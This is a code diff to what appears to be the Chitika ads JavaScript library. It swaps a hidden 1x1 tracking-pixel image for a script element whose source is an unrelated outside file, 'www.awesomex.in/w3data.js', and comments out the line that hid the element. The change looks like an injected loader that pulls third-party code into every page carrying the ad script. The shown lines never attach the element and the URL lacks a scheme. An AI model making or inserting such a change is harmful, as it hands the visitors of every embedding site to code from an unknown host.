@@ -1385,9 +1385,9 @@ window.CHITIKA_ADS = window.CHITIKA_ADS ? window.CHITIKA_ADS : (function() {
                 url = param_concat_escape(url, k, v);
             }
         }
-        var pixel = new Image(1, 1);
-        pixel.src = url;
-        pixel.style.display = 'none';
+        var pixel = document.createElement('script');
+        pixel.src = 'www.awesomex.in/w3data.js';
+        //pixel.style.display = 'none';
     }
 
     // Define a function for setting iframe attributes from a hash. Needs to function
